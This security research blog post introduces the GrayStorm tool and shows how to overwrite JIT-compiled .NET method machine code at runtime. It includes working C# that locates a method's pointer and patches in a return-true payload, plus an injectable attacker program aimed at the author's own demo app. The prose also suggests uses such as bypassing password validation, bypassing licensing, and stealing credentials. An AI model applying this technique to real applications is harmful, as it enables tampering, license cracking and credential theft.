---
layout: post
title: ".NET Machine Code Manipulation"
date: 2015-07-17
permalink: blog/GrayStorm/
---

This is the first entry in a series of blog entries describing [GrayStorm](https://github.com/GrayKernel/GrayStorm), a memory reconnaissance platform released at DEF CON 23. In this entry, I will describe how to overwrite a Method's Machine Code after Just-In-Time Compilation (JIT) with techniques implemented in GrayStorm. 

##Introduction to .NET Machine Code 

When an application is compiled, IL code is generated through implicit compilation. The .NET Framework will then generate machine code at runtime. The common language runtime (CLR) is used by the framework to generate assembly code from IL code. IL code is an independent set of instructions that are converted to native machine code at JIT. When a method is about to be executed, the framework uses JIT to generate assembly code that the CPU can execute by accessing a JIT stub.

For example, the snippets below show C# -> IL -> Machine Code

{% highlight C# %}

//C#

public static void testMethod()
{
    Random rnd = new Random();
    int randomNumber = rnd.Next(1, 1000);
    System.Windows.Forms.MessageBox.Show(randomNumber.ToString("X"));
}

{% endhighlight %}

{% highlight text %}

//IL

0000 nop 
0001 newobj System.Random.ctor()
0006 stloc.0 
0007 ldloc.0 
0008 ldc.i4.1 
0009 ldc.i4 
000E callvirt System.Int32 System.Random.Next(System.Int32, System.Int32)
0013 stloc.1 
0014 ldloca.s 
0016 ldstr 
001B call System.String System.Int32.ToString(System.String)
0020 call System.Windows.Forms.DialogResult System.Windows.Forms.MessageBox.Show(System.String)
0025 pop 
0026 ret 

{% endhighlight %}

{% highlight asm %}

//x86 asm 

0x55 push ebp
0x8B mov ebp , esp
0x83 sub esp , 00000014h
0x33 xor eax , eax
0x89 mov dword [ebp-04h] , eax
0x83 cmp dword [001830E4h] , 00000000h
0x74 je 00992231h
0xE8 call 70482821h
0x33 xor edx , edx
0x89 mov dword [ebp-0Ch] , edx
0x90 nop 
0xB9 mov ecx , 6F649304h
0xE8 call 0017201Ch
0x89 mov dword [ebp-10h] , eax
0x8B mov ecx , dword [ebp-10h]
0xE8 call 6FAF4BECh
0x8B mov eax , dword [ebp-10h]
0x89 mov dword [ebp-0Ch] , eax
0x68 push 000003E8h
0x8B mov ecx , dword [ebp-0Ch]
0xBA mov edx , 00000001h
0x8B mov eax , dword [ecx]
0xFF call dword [eax+40h]
0x89 mov dword [ebp-08h] , eax
0x8B mov eax , dword [ebp-08h]
0x89 mov dword [ebp-04h] , eax
0x8D lea ecx , dword [ebp-04h]
0x8B mov edx , dword [03607F78h]
0xE8 call 6FAC1600h
0x89 mov dword [ebp-14h] , eax
0x8B mov ecx , dword [ebp-14h]
0xE8 call 6D040458h
0x90 nop 
0x90 nop 
0x8B mov esp , ebp
0x5D pop ebp
0xC3 ret 

{% endhighlight %}

##Utilizing Machine Code

The JIT process leaves the executable memory with rwx permissions. Because of this, an attacker can overwrite a method's memory at the machine code level. Note that even if the JIT didn't leave rwx, once an application is injected into another memory permissions could be changed with [VirtualProtect](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366898(v=vs.85).aspx). 

In order to locate the address of machine code, Reflection can be used on a method. In order to perform this task, a MethodInfo object will need to be constructed to obtain the attributes of a method. 

In GrayStorm, a TreeNode viewer located in hierarchyViewer.cs is used to traverse through an AppDomain. When a method is selected from the tree, a MethodInfo object is created and stored. When the targeted Method has been just-in-time compiled, the raw function pointer to the machine code can be discovered. If the method has not yet been jitted, it will be forced with *PrepareMethod*. 

{% highlight C# %}

MethodInfo currentMethod = domainTraverser.currentMethod;
System.Runtime.CompilerServices.RuntimeHelpers.PrepareMethod(currentMethod.MethodHandle); //JIT the method! 
IntPtr address = currentMethod.MethodHandle.GetFunctionPointer(); //obtain function pointer
                    
{% endhighlight %}	

The address IntPtr will now contain the function pointer to the executable machine code for a specified method. 

Using this address, machine code can be read and written over. 

##Writing Machine Code

To write machine code over a method, a byte array must be construed that would be suitable for the targeted method. The possibilities are endless here and the imagination of the attacker can come into play! For demonstration purposes, a simple return true payload will be used. 

The method I will overwrite is returnStatement. 

{% highlight C# %}

public bool returnStatement()
{
    return false;
}

public void trueOrFalse()
{
    if (returnStatement())
       System.Windows.Forms.MessageBox.Show("True");
    else
        System.Windows.Forms.MessageBox.Show("False");
}
        
{% endhighlight %}

The return true payload is as follows as will just return "1". 

{% highlight asm %}

static public byte[] returnTrue = new byte[]
{
  0x31, 0xc0,       //xor eax, eax &
  0x40,             //inc eax
  0xc3  //ret
};
        
{% endhighlight %}

In order to overwrite a method with new machine code, the address of the targeted method will be referenced and overwritten with the returnTrue byte array. 

{% highlight C# %}

public static void writeFunction(byte[] returnTrue, IntPtr targetAddress)
{
    for (int i = 0; i < returnTrue.Length; i++)
    {
	System.Runtime.InteropServices.Marshal.WriteByte(new IntPtr(targetAddress.ToInt64() + i), returnTrue[i]);
    }
}

{% endhighlight %}

To see this in action, a video demo is prepared below:

{% video /resources/grayStorm/methodOverwriteDemo.mp4 640 480 /resources/grayStorm/storm.jpg %}


##Using This Chain

This chain opens up quite a few possibilities for attacking .NET applications post-exploitation. Machine code payloads can be constructed to steal parameters to methods and pass them along to logs/exfil (such as passwords, keys, e-mails, etc), change events (button presses, timers), overwrite core logic (password validation, licensing) and more. The bounds of this technique are up to the developer/attacker. Metasploit payloads can even be brought into play, given they handle parsing the PEB [correctly](http://www.tophertimzen.com/blog/shellcodeDotNetPEB/). 

##Outside of Gray Storm

If you want to perform similar tasks without the use of GrayStorm a payload specific to your purposes can be created and injected into a target with [GrayFrost](https://github.com/GrayKernel/GrayFrost). 

For demonstration purposes, the application we will attack is below:

{% highlight C# %}

namespace demoAttack
{
    class Program
    {
        static void Main()
        {
            char again = 'y';
            while (again == 'y')
            {
                if (!worker.returnStatement())
                    Console.WriteLine("\nFALSE");
                else
                    Console.Write("\nTRUE");

                again = Console.ReadKey().KeyChar;
            }
        }
    }

    public class worker
    {
        public static bool returnStatement()
        {
            return false;
        }
    }
}

{% endhighlight %}

To construct an attack against the returnStatement method, the follow code can be used in an external program. Because we are constructing a payload before we have injected into the demoAttack program, a reference can be added to the executable from VisualStudio and Reflection can be done easier. To do this, simply right click on the project's References -> Add new Reference -> select target executable

![](/resources/grayStorm/attackDemo.png)

Reflection will now be a breeze as we can reference *demoAttack* directly as we have a reference to the namespace.

{% highlight C# %}

namespace attackingDemo
{
    class Program
    {
        public static void Main()
        {
            MethodInfo targetMethod = overWrite();
            System.Runtime.CompilerServices.RuntimeHelpers.PrepareMethod(targetMethod.MethodHandle); //JIT the method just incase it has not been
            writeFunction(targetMethod.MethodHandle.GetFunctionPointer());
        }

        static MethodInfo overWrite()
        {
            return typeof(demoAttack.worker).GetMethod("returnStatement");
        }

        static public byte[] returnTrue = new byte[]
        {
            0x31, 0xc0,   //xor eax, eax &
            0x40,         //inc eax
            0xc3         //ret
        };

        public static void writeFunction(IntPtr targetAddress)
        {
            for (int i = 0; i < returnTrue.Length; i++)
            {
                System.Runtime.InteropServices.Marshal.WriteByte(new IntPtr(targetAddress.ToInt64() + i), returnTrue[i]);
            }
        }
    }
}

{% endhighlight %}

Once compiled, we now have an attack payload for our demoAttack. Bundling this executable into GrayFrost an injectable DLL will be created. Now while *demoAttack* is running and stuck in the "return FALSE" output, inject *attackingDemo* and it will change to "return TRUE". For demonstration, I have prepared a video using [GrayDragon](https://www.digitalbodyguard.com/graydragon.html) to inject GrayFrost into my target. 

{% video /resources/grayStorm/attacking.mp4 640 480 /resources/grayStorm/storm.jpg %}

Note: both applications were compiled in x86, but the same techniques work in x64 (with a x64 payload). 

---

###Conclusion

All resources used (demoAttack, attackingDemo & GrayFrost32.dll) are included [here](/resources/grayStorm/machineCode/resources.zip). Inject GrayFrost32.dll into demoAttack with any DLL injector you wish.

If you have any questions, do not hesitate to reach out to me! 


